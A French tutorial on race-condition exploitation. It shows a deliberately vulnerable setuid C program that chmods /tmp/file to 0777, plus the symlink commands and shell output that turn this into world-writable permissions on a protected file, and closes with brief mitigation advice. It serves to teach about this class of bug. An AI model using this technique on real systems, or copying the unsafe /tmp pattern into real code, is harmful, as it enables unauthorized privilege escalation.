# Race Condition

## I. Introduction
L'idée de la Race Condition est de profiter de l'accès concurrent de deux acteurs à une même ressource, et qu'au moins l'un d'entre eux est susceptible de modifier l'état de celle-ci. Nous allons par exemple ici rediriger les actions effectuées par le programme `vuln` d'un fichier à un autre.

## II. Pré-requis
* Avoir le droit de lecture écriture dans `/tmp/`
* Le programme `vuln` est suid, ou bien éxécuté par un utilisateur ayant les bons privilèges

```{r, engine='bash'}
aas@air:~$ cat vuln.c
int main(int arc, char **argv)
{
	int fd = open("/tmp/file",O_RDWR|O_CREAT, 0666);
	chmod("/tmp/file", 0777);
	close(fd);
	return 0;
}
```

Ce programme accorde des droits rwx à tout le monde pour le fichier `/tmp/file`. 

## III. Exploitation
Mettons que nous souhaitions maintenant écrire dans un fichier `/tmp/interdit` auquel nous n'avons pas les droits en écriture. Si nous pouvions détourner les actions entreprises par le programme `vuln` sur `/tmp/file` à `/tmp/interdit`, nous obtiendrions les droits nécéssaires. Cela est possible grace aux liens symboliques.

### Création du lien symbolique
```{r, engine='bash'}
aas@ubuntu:~$ ln -s /tmp/interdit /tmp/file
aas@ubuntu:~$ ls -l
total 13
-rwsr-xr-x  1 root       root      11238 2012-06-26 15:27 vuln
-rw-r--r--  1 root       root        188 2012-06-26 15:26 vuln.c
lrwxrwxrwx  1 aas        aas           9 2012-07-06 15:35 file -> interdit
-rw-r--r--  1 root       root          0 2012-07-06 15:22 interdit
```
Le fichier `file` pointe vers `interdit`. Lorsqu'on agit sur `file`, on agit donc en réalité sur `interdit`.

### Execution
```{r, engine='bash'}
aas@ubuntu:~$ ./vuln
aas@ubuntu:~$ ls -l
total 13
-rwsr-xr-x  1 root       root      11238 2012-06-26 15:27 vuln
-rwsr--r--  1 root       root        188 2012-06-26 15:26 vuln.c
lrwxrwxrwx  1 aas        aas           9 2012-07-06 15:35 file -> interdit
-rwxrwxrwx  1 root       root          0 2012-07-06 15:22 interdit
```
Lorsque `vuln` est executé, il cherche à attribué les droits 777 à `file`, mais puisque `file` est un lien symbolique vers `interdit`, les droits sont en réalité affectés à `interdit`. Nous avons accédé de manière concurrente à une resource, l'avons modifié, et par conséquent avons trompé le programme vulnérable.

## IV. Sécurisation
Même s'il n'y a pas vraiment de protection efficace, notons que les mécanismes de sélection d'accès (sémaphores par exemple) doivent être mis en place, il faut protéger les repertoires temporaires avec l'option `nosuid`, etc...

## V. Sources
[Lien1](http://blog.stalkr.net/2010/11/exec-race-condition-exploitations.html)
